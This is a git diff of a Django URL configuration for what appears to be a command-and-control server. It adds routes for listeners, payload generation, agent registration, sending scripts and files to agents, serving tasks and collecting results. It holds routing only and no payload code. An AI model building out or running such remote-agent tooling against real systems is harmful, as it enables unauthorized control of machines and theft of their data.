@@ -1,9 +1,26 @@
+from urllib import request
 from django.urls import path
-from . import views 
+from . import views
+# from views import views.Listener
+
+#ddasdx
+#/sc/ddasdx
+#/sc/
 urlpatterns = [
     path('', views.LoginPage , name='blog-login'),
     path('homePage/' , views.HomePage  , name='blog-home'),
     path('listeners/' , views.ListenersPage  , name='blog-listener'),
-    path('screenshot/' , views.ScreenShotMethod  , name='blog-screenshot'),
     path('directorylist/' , views.dirlist  , name='blog-directorylist'),
+    path('start-listener/' , views.TestPage , name='blog-test'),
+    path('postlistener/' , views.Listener.PostListener.as_view() , name='blog-listener'),
+    path('payload-Gen/' , views.Listener.payloadGen.as_view() , name='blog-payload'),
+    path('reg/' , views.registerAgent , name='blog-register'),
+    path('sc/<eth>/',views.Listener.agent.sendScript,name='blog-sendScript'),
+    path('download/<eth>/',views.Listener.agent.sendFile,name='blog-sendFile'),
+    path('tasks/<name>/',views.Listener.agent.serveTasks,name='blog-serveTasks'),
+    path('results/<name>', views.Listener.agent.receiveResults , name='blog-result'),
+
+    
+    # path('results/{}'.format(Listener.name) , views.receiveResults , name='blog-result'),
 ]
+
